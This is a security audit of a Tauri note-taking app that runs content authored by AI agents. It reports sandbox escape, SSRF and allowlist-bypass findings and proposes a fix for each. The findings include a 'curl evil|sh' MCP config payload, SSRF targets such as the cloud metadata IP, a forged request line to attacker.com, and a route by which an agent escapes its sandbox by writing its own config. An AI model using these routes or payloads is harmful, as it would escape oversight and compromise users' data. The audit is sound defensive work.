# Notesage Security Audit — 2026-06-03

**Scope:** Tauri v2 + React 19/TS frontend, Rust backend (`src-tauri/`). Read-only review.
**Threat model emphasis:** This app runs untrusted AI-agent-authored content (markdown, skill files, MCP configs) and opens untrusted documents. The primary adversary is a compromised/misaligned agent or a malicious document attempting to (a) read/exfiltrate user data outside its project scope, (b) escape the Seatbelt sandbox, or (c) achieve code execution / SSRF.

The repo has genuinely strong, well-tested isolation (kernel-enforced Seatbelt deny-by-default, per-agent config narrowing, scoped approvals, parameterized SQL, keychain credentials). The findings below are gaps and bypasses in that otherwise-solid posture.

## Severity counts

| Severity | Count |
| --- | --- |
| Critical | 1 |
| High | 3 |
| Medium | 4 |
| Low | 3 |
| Info / Confirmed-good | 6 |

---

## CRITICAL

### C1 — Sandbox escape: agent can self-enable a global MCP server → unsandboxed RCE

**Location:** `src-tauri/src/commands/mcp.rs:569-593` (enable-default logic) + `src-tauri/src/commands/sandbox.rs:38` (writable `~/.notesage`) + `src-tauri/src/commands/mcp.rs:383` (unsandboxed spawn)

**Evidence:**

`map_config_entries` only forces `enabled = false` for the **project** source. The **global** source (`~/.notesage/mcp.json`) defaults to `enabled = !entry.disabled` — i.e. *enabled* when the entry omits `disabled`:

```rust
// mcp.rs:577
let enabled = if source == McpConfigSource::NotesageProject {
    false
} else {
    !entry.disabled   // NotesageGlobal / external sources default ENABLED
};
```

The Seatbelt profile unconditionally grants every agent **write** access to `~/.notesage` (it is emitted into both the read- and write-allow blocks regardless of `writable_paths`):

```rust
// sandbox.rs:38
let mut entries = vec![SandboxEntry::Subpath(".notesage")];
```

MCP servers are spawned **outside** any sandbox — a plain `tokio::process::Command` with the login-shell `PATH` injected:

```rust
// mcp.rs:383
let mut spawn_cmd = tokio::process::Command::new(&config.command);
spawn_cmd.args(&config.args) ... // no sandbox-exec wrapper, no Seatbelt
```

**Impact:** A sandboxed agent (scoped to one project, kernel-denied from `$HOME`) can write `~/.notesage/mcp.json` (the one `$HOME` dir it is always allowed to write). On the next discovery/rescan (`mcp_discover_configs`, triggered by the file watcher's `rescanCounter` bump), that server is registered **enabled by default**, and when its tools are next invoked it is spawned as an **unsandboxed** child with the user's full privileges and PATH. This is a full break of the kernel-enforced sandbox: `{"command":"bash","args":["-c","curl evil|sh"]}` runs with no Seatbelt, no network proxy, no `$HOME` deny. The project-scoped `disabled` default was clearly intended to block exactly this ("prevents auto-execution of commands from cloned repos", comment at mcp.rs:576) but the global path was left open, and the global path is the one the sandbox makes writable.

**Concrete fix:**
1. Default **all** discovered MCP servers to `enabled = false` regardless of source; require an explicit user toggle before first spawn (the store already has `enabledOverrides`).
2. Treat `~/.notesage/mcp.json` writes as a trust boundary: either remove `~/.notesage` from the agent-writable Seatbelt block (scope agent writes to project paths only) or carve out `mcp.json` / `skills/` from the writable subpath.
3. Consider spawning MCP servers under the same Seatbelt wrapper used for ACP agents.

---

## HIGH

### H1 — Asset-protocol scope is effectively the entire home directory (`$HOME/**`)

**Location:** `src-tauri/tauri.conf.json:36` ; regression test `src/lib/__tests__/tauri-capability-surface.test.ts:48-77`

**Evidence:**

```json
// tauri.conf.json — assetProtocol.scope.allow
"$HOME/**", "$APPDATA/**", "$APPLOCALDATA/**", "$APPCACHE/**", "$RESOURCE/**", "$TEMP/**"
```

`resolveImageSrc` happily converts any absolute path to an `asset:` URL:

```ts
// src/lib/image-utils.ts:36
if (decoded.startsWith("/")) { return convertFileSrc(decoded); }
```

`docs/architecture.md` claims the scope is "a finite list of Tauri path variables ... instead of `**` [so it] can no longer serve files outside the user's home directory." The first half is true, but **`$HOME/**` covers every file under the user's home directory** — `.ssh`, `.aws`, other projects, `.env`, browser profiles, etc. The regression test only asserts no literal `**` and that each entry starts with `$` (line 74) — `$HOME/**` passes both, so the test gives false assurance that the hole is closed.

**Impact:** Agent-authored markdown rendered in the editor can reference `![x](/Users/victim/.ssh/id_rsa)` or any home-dir file; the WebView will load it through the asset protocol. While `<img>` can't trivially exfil text content cross-origin, it is a confirmed read-primitive into the entire home dir from injected content, and it directly contradicts the documented project-isolation guarantee. Asset-protocol reads are NOT gated by the agent Seatbelt profile (the profile constrains the *agent subprocess*, not the Tauri WebView).

**Concrete fix:** Narrow the asset scope to the directories the viewers actually need (the app's own `$APPDATA`/`$APPCACHE`/`$RESOURCE`/`$TEMP`, plus a per-open-project allow added at runtime rather than a blanket `$HOME/**`). Tighten the regression test to reject any entry ending in `$HOME/**` / `/**` at the home root.

### H2 — SSRF in `fetch_link_metadata` (auto-triggered, no scheme/host allowlist)

**Location:** `src-tauri/src/commands/link_preview.rs:16-54` ; auto-fetch trigger `src/components/editor/LinkPreviewCard.tsx:35-57`

**Evidence:** The command fetches whatever URL it is handed, server-side, with a real browser UA and follows up to 3 redirects. There is no validation of scheme, host, or address range:

```rust
// link_preview.rs:23
let resp = client.get(&url).header("User-Agent", "Mozilla/5.0 ...").send().await?;
```

The fetch is **not** behind a user click. A `link-preview` node that has a `url` but no `title` auto-fetches as soon as it renders:

```ts
// LinkPreviewCard.tsx:36
if (!url || title || state !== "loading") return;
... tauriApi.fetchLinkMetadata(url) ...
```

Agent-authored markdown using the `> [!link](url)` syntax (documented in `editor.md`) creates exactly such a node. The Tauri command runs in the **main backend process**, which is NOT inside the agent Seatbelt sandbox and NOT routed through the per-agent network proxy.

**Impact:** A malicious document/agent can make the Notesage backend issue arbitrary GET requests to `http://169.254.169.254/latest/meta-data/` (cloud metadata), `http://localhost:8190/...` (the app's own local llama FIM/inference server), router admin panels, or internal services — bypassing both the kernel network-deny and the domain-approval proxy that constrain agents. Redirect-following (3 hops) defeats naive "block localhost in the literal URL" checks. The returned title/description is reflected back into the document, providing a partial read-back channel.

**Concrete fix:** Restrict to `https://` (and maybe `http://`) only; resolve the host and reject loopback / link-local / RFC-1918 / `.local` / metadata IPs *before* connecting and *after each redirect* (resolve-then-pin, or a redirect policy that re-validates). Consider routing this fetch through the same domain-approval flow used for agents, or gating it behind explicit user action rather than auto-fetch on render.

### H3 — `og:image` / `favicon` fetched by SSRF are rendered as live `<img>` (amplifies H2 + tracking)

**Location:** `src-tauri/src/commands/link_preview.rs:70-72` ; `src/components/editor/LinkPreviewCard.tsx:103,191-192`

**Evidence:** `parse_html_metadata` extracts `og:image` and favicon URLs from the (attacker-controlled) page and returns them; the card renders them directly:

```ts
// LinkPreviewCard.tsx:103
const showImage = imageUrl && !imgError;   // <img src={imageUrl}>
// :191  <img src={faviconUrl} ...>
```

Because asset scope is `$HOME/**` (H1), an attacker page could even return `og:image` pointing at... only remote URLs pass through here (resolve_url only produces http/https), so the main risk is a second uncontrolled outbound request from the WebView to an attacker-chosen URL the moment a link card renders — a tracking pixel / beacon that fires automatically and isn't subject to the agent proxy.

**Impact:** Automatic, un-approved outbound requests from the renderer to arbitrary attacker-chosen hosts on document open (read receipts / deanonymization / IP leak), and a second SSRF-adjacent vector since the image URL is taken verbatim from the fetched page.

**Concrete fix:** Apply the same host validation as H2 to `image_url`/`favicon_url`; or proxy preview images through the backend with validation; or only render preview images after explicit user opt-in.

---

## MEDIUM

### M1 — No Content-Security-Policy on the main WebView (`csp: null`)

**Location:** `src-tauri/tauri.conf.json:30`

**Evidence:** `"csp": null`. The app ships no CSP for the main window. The HTML export path *does* set a strict CSP (`html_styles.rs:429`), proving the team knows the mechanism — but the live app has none.

**Impact:** If any XSS sink is reached (the app uses `dangerouslySetInnerHTML` in several places and `DOMPurify.sanitize().innerHTML` in `ai-suggestion.ts`, `external-diff.ts`), there is no second line of defense: injected script could exfil to any origin, load remote code, etc. The current sinks appear sanitized (see Confirmed-Good), so this is defense-in-depth, not a live exploit — but for an app that renders untrusted agent/document content, a missing CSP is a notable gap.

**Concrete fix:** Set a restrictive `csp` (e.g. `default-src 'self'; img-src 'self' asset: https: data:; connect-src 'self' https://github.com ...; script-src 'self'`). Validate Tiptap/Vite still work; use a nonce/hash strategy if inline styles are required.

### M2 — Skill-script execution runs unsandboxed with AI-controlled `working_dir` and env

**Location:** `src-tauri/src/commands/script_exec.rs:21-80`

**Evidence:** Good path-traversal protection on the *script path* (canonicalize + `starts_with(skill_dir)`, line 38). But the script is then run as a normal child process — no Seatbelt — with a `working_dir` and `env` taken straight from the caller (line 53-75), and interpreter resolved from the file's own shebang (line 142-169). `execute_skill_script` is one of the AI tool-calling tools.

**Impact:** When a script-bearing skill is invoked (gated by the "requires approval" tool permission), the script executes with the user's full privileges, outside the agent sandbox, with attacker-influenced cwd/env. A skill authored by an agent (agents can write to `~/.notesage/skills/`, same writable carve-out as C1) plus a single "allow always" approval = persistent unsandboxed execution. The shebang resolution also means a skill file can pick any interpreter on PATH.

**Concrete fix:** Run skill scripts under the same Seatbelt wrapper as ACP agents (scoped writable paths, network proxy). Restrict `working_dir` to within the active project scope. Don't let agent-writable dirs (`~/.notesage/skills`) be a source of auto-approved executables — tie `skillScriptAlways` to a content hash so a rewritten script re-prompts.

### M3 — Plain-HTTP proxy upstream host can diverge from the validated host

**Location:** `src-tauri/src/commands/network_proxy.rs:323-357`

**Evidence:** For plain HTTP, the allowlist check uses `extract_host_from_request`, which prefers the **`Host:` header** (line 546-550). The upstream TCP connection, however, is built from the **request-line URL** (`target_url`, line 343-353). These two are independent and attacker-controlled in a forged request:

```rust
let domain = extract_host_from_request(&request_str, target_url)?;   // checks Host: header
...
let upstream_addr = if target_url.starts_with("http://") { /* from URL */ ... }
```

**Impact:** A request line `GET http://attacker.com/ HTTP/1.1` with header `Host: api.anthropic.com` would pass the allowlist (Host matches) but connect upstream to `attacker.com`. This lets a sandboxed agent that can reach the proxy port exfiltrate to a non-allowlisted host over plain HTTP. Mitigated in practice because (a) most agent traffic is HTTPS via CONNECT, where host and upstream both come from the same `target` (consistent), and (b) `default-src` allowlists are small — but the plain-HTTP path is a real allowlist bypass.

**Concrete fix:** For plain HTTP, derive the validated domain and the upstream connection from the **same** source (parse the absolute-form request URI per RFC 7230 and use its host for both check and connect; reject if `Host:` header disagrees). Reject requests whose request-target host ≠ checked host.

### M4 — API keys can still transit IPC via the explicit `api_key` parameter

**Location:** `src-tauri/src/commands/ai.rs:50-56`, `ai.rs:156,182,213` (commands accept `api_key: Option<String>`)

**Evidence:** `resolve_api_key` prefers an explicit `api_key` passed over IPC and only falls back to the keychain:

```rust
// ai.rs:51
if let Some(key) = api_key.as_ref() { if !key.is_empty() { ... return Ok(Some(key.clone())); } }
```

The architecture doc states "keys never transit through Tauri IPC." The keychain path (`connection_id`) honors that, but the `api_key` parameter is still a live ingress; any frontend caller passing it (or an XSS payload constructing an `invoke('ai_chat_stream', { apiKey })`) moves the secret over IPC.

**Impact:** Weakens the keychain guarantee and the "keys never in console/IPC" claim. Lower severity because the default code path uses `connection_id`; this is mostly a legacy/compat surface.

**Concrete fix:** Remove the `api_key` parameter from the IPC commands once migration is complete; resolve exclusively via `connection_id`. If a transition shim is still needed, gate it behind a build flag.

---

## LOW

### L1 — `process:default` capability granted to the renderer

**Location:** `src-tauri/capabilities/default.json:12`

The `process:default` permission exposes `process:allow-exit` / `process:allow-restart` to the WebView. Not RCE, but lets injected JS terminate/restart the app (DoS / interrupt-at-a-bad-moment). Drop it unless the renderer genuinely needs to exit/relaunch programmatically.

### L2 — HTTP-error strings echo full file paths and target URLs

**Location:** e.g. `file.rs:17,27`, `link_preview.rs` / `network_proxy.rs` `format!("... {}", path/target, e)`

Error messages embed absolute paths and upstream targets and are surfaced to the frontend (and often toasts). Minor information disclosure (home-dir layout, internal hostnames). Consider trimming sensitive detail from user-facing error strings while keeping it in backend logs.

### L3 — `basic-ftp` HIGH advisory in the dependency tree (dev-only)

**Location:** `pnpm audit` → `@wdio/cli > ... > basic-ftp <=5.3.0` (GHSA-rpmf-866q-6p89, DoS)

Transitively pulled in by the WebDriverIO real-E2E tooling — not shipped in the app bundle. Also 1 moderate. Low risk (dev/test only) but should be bumped. `cargo audit` could not be run (cargo-audit not installed in this environment) — recommend wiring `cargo audit` into CI.

---

## Confirmed-Good Patterns

| Check | Status | Evidence |
| --- | --- | --- |
| SQL injection (document index) | **Safe** | `index/queries.rs` — every value bound via `?N` + `params!`; only placeholder *positions* are `format!`'d into SQL. LIKE `%`/`_`/`\` escaped (queries.rs:479-483); FTS5 quotes doubled (queries.rs:531). |
| Credential storage | **Safe** | `credentials.rs` — OS keychain via `keyring`; keys never written to localStorage; no key values logged (only `service`/`connection_id` in logs). |
| Skill-script path traversal | **Safe** | `script_exec.rs:29-40` — canonicalize + `starts_with(skill_dir)` guard; test `execute_script_rejects_path_traversal`. (Runtime sandboxing is the gap — see M2.) |
| Markdown/HTML preview XSS | **Safe** | `MarkdownPreview.tsx:103` renders comrak output configured **without** `unsafe_`, so raw HTML in markdown is escaped (`markdown_to_html.rs:99`). |
| HTML viewer default render | **Safe (opt-in risk well-flagged)** | `HtmlViewer.tsx:180` DOMPurify with `FORBID_TAGS: script/iframe/object/embed`; script execution only via explicit `allowScripts` setting + a confirmation dialog (sandboxed iframe, no `allow-same-origin`). |
| Seatbelt profile core | **Safe / strong** | `sandbox.rs` — `(deny default)`, `$HOME` deny-by-default with curated re-allow, per-agent config narrowing (task #24), kernel network-deny + proxy-only allow, `.ssh`/`.aws`/`.gnupg`/`.env` deny-last. Extensively unit-tested. |
| Domain matching | **Safe** | `network_proxy.rs:516-526` — no suffix-bypass (`evilexample.com` rejected), wildcard requires a real subdomain label; good test coverage. |

---

## Where the old `audit-security` skill was stale/silent

1. **MCP/agent subprocess trust (C1).** The skill's "Command injection" and "Sandbox integrity" sections only ask whether subprocess args are arrays and whether `(deny default)` appears — both pass here. They never consider that an agent can **write its own config** into an always-writable dir (`~/.notesage`) that then drives an **unsandboxed** MCP spawn. The escalation is a composition of three individually-fine components; a checklist that audits each in isolation misses it. A modern Tauri/ACP review has to follow the agent-writable → discovery → spawn data flow.

2. **Asset-protocol scope `$HOME/**` (H1).** The skill says nothing about the Tauri v2 asset protocol. The repo's own regression test enforces only "not literally `**` and starts with `$`," which `$HOME/**` satisfies while still exposing the whole home directory — a false sense of closure. A current review must treat `$HOME/**` as equivalent to "all user files" and reconcile it against the documented isolation promise.

3. **SSRF via auto-fetched link previews (H2/H3).** The skill's SSRF coverage is implicit at best. The link-preview command fetches arbitrary URLs from the *main process* (outside the agent proxy) and does so **automatically on render** of agent-authored `[!link]` nodes — a vector specific to an app that renders untrusted AI content, which the older checklist doesn't enumerate.
